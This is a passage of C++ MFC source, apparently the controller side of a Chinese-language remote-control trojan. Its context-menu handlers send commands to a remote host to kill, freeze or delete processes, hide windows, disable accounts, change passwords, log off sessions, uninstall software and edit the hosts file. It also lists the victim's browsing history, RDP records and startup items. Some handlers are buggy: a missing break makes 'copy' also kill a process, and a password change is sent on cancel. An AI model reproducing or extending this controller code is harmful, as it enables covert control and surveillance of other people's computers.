	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 100:
	{
		if (m_list.GetSelectedCount() < 1)
		{
			return;
		}
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		CString Data;
		CString temp;
		while (pos)
		{
			temp = _T("");
			int	nItem = m_list.GetNextSelectedItem(pos);
			for (int i = 0; i < m_list.GetHeaderCtrl()->GetItemCount(); i++)
			{
				temp += m_list.GetItemText(nItem, i);
				temp += _T("	");
			}
			Data += temp;
			Data += _T("\r\n");
		}
		SetClipboardText(Data);
	}
	break;
	case 200:
	{
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		while (pos)
		{
			int	nItem = m_list.GetNextSelectedItem(pos);
			LPBYTE lpBuffer = new BYTE[1 + sizeof(DWORD)];
			lpBuffer[0] = COMMAND_PROCESS_KILLDEL;
			DWORD dwProcessID = m_list.GetItemData(nItem);
			memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
			SAFE_DELETE_AR(lpBuffer);
		}
	}
	break;
	case 300:
	{
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		while (pos)
		{
			int	nItem = m_list.GetNextSelectedItem(pos);
			LPBYTE lpBuffer = new BYTE[1 + sizeof(DWORD)];
			lpBuffer[0] = COMMAND_PROCESS_KILL;
			DWORD dwProcessID = m_list.GetItemData(nItem);
			memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
			SAFE_DELETE_AR(lpBuffer);
		}
	}
	break;
	case 400:
	{
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		while (pos)
		{
			int	nItem = m_list.GetNextSelectedItem(pos);
			LPBYTE lpBuffer = new BYTE[1 + sizeof(DWORD)];
			lpBuffer[0] = COMMAND_PROCESS_FREEZING;
			DWORD dwProcessID = m_list.GetItemData(nItem);
			memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
			SAFE_DELETE_AR(lpBuffer);
		}
	}
	break;
	case 500:
	{
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		while (pos)
		{
			int	nItem = m_list.GetNextSelectedItem(pos);
			LPBYTE lpBuffer = new BYTE[1 + sizeof(DWORD)];
			lpBuffer[0] = COMMAND_PROCESS_THAW;
			DWORD dwProcessID = m_list.GetItemData(nItem);
			memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
			SAFE_DELETE_AR(lpBuffer);
		}
	}
	break;
	case 600:
	{
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		while (pos)
		{
			int	nItem = m_list.GetNextSelectedItem(pos);
			LPBYTE lpBuffer = new BYTE[1 + sizeof(DWORD)];
			lpBuffer[0] = COMMAND_PROCESS_DEL;
			DWORD dwProcessID = m_list.GetItemData(nItem);
			memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
			SAFE_DELETE_AR(lpBuffer);
		}
	}
	break;
	default:
		break;
	}

	menu.DestroyMenu();

}
//网络菜单
void CHostDlg::ShowNetList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("结束进程"));
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 100:
	{
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			//获取内容
			CString temp = m_list.GetItemText(nItem, 4);
			SetClipboardText(temp);
		}
	}
	case 200:
	{
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		while (pos)
		{
			int	nItem = m_list.GetNextSelectedItem(pos);
			LPBYTE lpBuffer = new BYTE[1 + sizeof(DWORD)];
			lpBuffer[0] = COMMAND_PROCESS_KILL;
			DWORD dwProcessID = m_list.GetItemData(nItem);
			memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
			SAFE_DELETE_AR(lpBuffer);
		}
	}

	}
	menu.DestroyMenu();
}
//windows菜单
void CHostDlg::ShowWndowsList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("还原窗口(&H)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("隐藏窗口(&Y)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("关闭窗口(&E)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 500, _T("最 大 化(&M)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 600, _T("最 小 化(&I)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 100:
	{
		if (m_list.GetSelectedCount() < 1)
		{
			return;
		}
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		CString Data;
		CString temp;
		while (pos)
		{
			temp = _T("");
			int	nItem = m_list.GetNextSelectedItem(pos);
			for (int i = 0; i < m_list.GetHeaderCtrl()->GetItemCount(); i++)
			{
				temp += m_list.GetItemText(nItem, i);
				temp += _T("	");
			}
			Data += temp;
			Data += _T("\r\n");
		}
		SetClipboardText(Data);
	}
	break;
	case 200:
	{
		BYTE lpMsgBuf[20];
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			ZeroMemory(lpMsgBuf, 20);
			lpMsgBuf[0] = COMMAND_WINDOW_OPERATE;
			DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
			m_list.SetItemText(nItem, 3, _T("发送还原命令"));
			memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
			DWORD dHow = SW_RESTORE;
			memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
		}
	}
	break;
	case 300:
	{
		BYTE lpMsgBuf[20];
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			ZeroMemory(lpMsgBuf, 20);
			lpMsgBuf[0] = COMMAND_WINDOW_OPERATE;
			DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
			m_list.SetItemText(nItem, 3, _T("发送隐藏命令"));
			memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
			DWORD dHow = SW_HIDE;
			memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
		}
	}
	break;
	case 400:
	{
		// TODO: Add your command handler code here
		BYTE lpMsgBuf[20];
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			ZeroMemory(lpMsgBuf, 20);
			lpMsgBuf[0] = COMMAND_WINDOW_CLOSE;
			DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
			m_list.SetItemText(nItem, 3, _T("发送关闭命令"));
			memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
		}
	}
	break;
	case 500:
	{
		BYTE lpMsgBuf[20];
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			ZeroMemory(lpMsgBuf, 20);
			lpMsgBuf[0] = COMMAND_WINDOW_OPERATE;
			DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
			m_list.SetItemText(nItem, 3, _T("发送最大化命令"));
			memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
			DWORD dHow = SW_MAXIMIZE;
			memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
		}
	}
	break;
	case 600:
	{
		BYTE lpMsgBuf[20];
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			ZeroMemory(lpMsgBuf, 20);
			lpMsgBuf[0] = COMMAND_WINDOW_OPERATE;
			DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
			m_list.SetItemText(nItem, 3, _T("发送最小化命令"));
			memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
			DWORD dHow = SW_MINIMIZE;
			memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
		}
	}
	break;
	default:
		break;
	}

	menu.DestroyMenu();
}
//用户菜单
void CHostDlg::ShowUserinfoList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("复制(&H)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("启用用户(&G)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("禁用用户(&K)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 500, _T("修改密码(&L)"));

	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 200:
		{
			int	nItem = m_list.GetSelectionMark();
			if (nItem >= 0)
			{
				CString tmp;
				tmp += m_list.GetItemText(nItem, 0) + " | ";
				tmp += m_list.GetItemText(nItem, 1) + " | ";
				tmp += m_list.GetItemText(nItem, 2);
				SetClipboardText(tmp);
			}
			break;
		}
	case 300:
	case 400:
		{
			int	nItem = m_list.GetSelectionMark();
			if (nItem >= 0)
			{
				CString user;
				user =  m_list.GetItemText(nItem, 0);
				char token[100] = {0};
				token[0]  = nMenuResult == 300 ? COMMAND_USER_ENABLE : COMMAND_USER_DISABLED;
				lstrcatA(&token[1],user.GetBuffer());
				m_iocpServer->Send(m_pContext,(PBYTE)&token[0],sizeof(token));
			}
			break;
		}
	case 500:
		{
			int	nItem = m_list.GetSelectionMark();
			if (nItem >= 0)
			{
				char token[150] = {0}; 
				token[0] = COMMAND_EDIT_PASS;

				CString user;
				user =  m_list.GetItemText(nItem, 0);
				
				CInputDlg InPut(this);
				InPut.Init("输入密码","请输入要更改的密码");
				if (InPut.DoModal() != IDOK || InPut.m_putdata.GetLength() != 0)
				{
					lstrcatA(&token[1],user.GetBuffer());
					lstrcatA(&token[1 + user.GetLength()+1],InPut.m_putdata.GetBuffer());
					m_iocpServer->Send(m_pContext,(PBYTE)&token[0],sizeof(token));
				}
			}
			break;
		}
		break;
	}
	menu.DestroyMenu();
}
//活动用户菜单
void CHostDlg::ShowUserList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("注销用户(&H)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("断开用户(&Y)"));
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 200:
	{
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 5);
			lpBuffer[0] = COMMAND_WTS_LOGOFF;
			DWORD dwProcessID = m_list.GetItemData(nItem);
			memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpBuffer, 5);
			LocalFree(lpBuffer);
		}
		
	}
	break;
	case 300:
	{
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 5);
			lpBuffer[0] = COMMAND_WTS_DIS;
			DWORD dwProcessID = m_list.GetItemData(nItem);
			memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
			m_iocpServer->Send(m_pContext, lpBuffer, 5);
			LocalFree(lpBuffer);
		}
	}
	break;
	}
	menu.DestroyMenu();
}
//软件菜单
void CHostDlg::ShowSoftwareList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("卸载程序(&X)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 100:
	{
		if (m_list.GetSelectedCount() < 1)
		{
			return;
		}
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		CString Data;
		CString temp;
		while (pos)
		{
			temp = _T("");
			int	nItem = m_list.GetNextSelectedItem(pos);
			for (int i = 0; i < m_list.GetHeaderCtrl()->GetItemCount(); i++)
			{
				temp += m_list.GetItemText(nItem, i);
				temp += _T("	");
			}
			Data += temp;
			Data += _T("\r\n");
		}
		SetClipboardText(Data);
	}
	break;
	case 200:
	{
		if (m_list.GetSelectedCount() < 1)
		{
			return;
		}

		if (MessageBox(_T("确定要卸载该程序?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
			return;

		POSITION pos = m_list.GetFirstSelectedItemPosition();
		CString str; CStringA str_a;
		while (pos)
		{
			int	nItem = m_list.GetNextSelectedItem(pos);
			str = m_list.GetItemText(nItem, 4);

			if (str.GetLength() > 0)
			{
				str_a = str;
				LPBYTE lpBuffer = new BYTE[1 + str_a.GetLength()];
				lpBuffer[0] = COMMAND_APPUNINSTALL;
				memcpy(lpBuffer + 1, str_a.GetBuffer(0), str_a.GetLength());
				m_iocpServer->Send(m_pContext, lpBuffer, str_a.GetLength() + 1);
				SAFE_DELETE_AR(lpBuffer);
			}
		}
	}
	break;
	default:
		break;
	}

	menu.DestroyMenu();
}
//浏览记录菜单
void CHostDlg::ShowHtmlList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据"));
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 100:
	{
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			CString temp;
			//获取内容
			temp += m_list.GetItemText(nItem, 3);
			SetClipboardText(temp);
		}
	}
	}
	menu.DestroyMenu();
}
//远程连接菜单
void CHostDlg::ShowMstscList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据"));
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 100:
	{
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			CString temp;
			//获取内容
			temp += m_list.GetItemText(nItem, 0) + " | ";
			temp += m_list.GetItemText(nItem, 1);
			SetClipboardText(temp);
		}
	}
	}
	menu.DestroyMenu();
}
//启动项菜单
void CHostDlg::ShowStartupList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据"));
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 100:
	{
		int	nItem = m_list.GetSelectionMark();
		if (nItem >= 0)
		{
			CString temp;
			//获取内容
			temp += m_list.GetItemText(nItem, 0) + " | ";
			temp += m_list.GetItemText(nItem, 1) + " | ";
			temp += m_list.GetItemText(nItem, 2);
			SetClipboardText(temp);
		}
	}
	}
	menu.DestroyMenu();
}
//host文件菜单
void CHostDlg::ShowHostsList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("增加条目(&S)"));
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:	reflush(); break;
	case 100:
	{
		if (m_list.GetSelectedCount() < 1)
		{
			return;
		}
		POSITION pos = m_list.GetFirstSelectedItemPosition();
		CString Data;
		CString temp;
		while (pos)
		{
			temp = _T("");
			int	nItem = m_list.GetNextSelectedItem(pos);
			for (int i = 0; i < m_list.GetHeaderCtrl()->GetItemCount(); i++)
			{
				temp += m_list.GetItemText(nItem, i);
				temp += _T("	");
			}
			Data += temp;
			Data += _T("\r\n");
		}
		SetClipboardText(Data);
		MessageBox(_T("已复制数据到剪切板"));
	}
	break;
	case 200:
	{
		CInputDlg InPut(this);
		InPut.Init("增加条目","请输入要增加的条目");
		if (InPut.DoModal() != IDOK || InPut.m_putdata.GetLength() == 0)
			return;

		InPut.m_putdata.Insert(0, COMMAND_HOSTS_SET);
		m_iocpServer->Send(m_pContext, (PBYTE)InPut.m_putdata.GetBuffer(), InPut.m_putdata.GetLength() + 1);
	}
	break;
	default:
		break;
	}

	menu.DestroyMenu();
}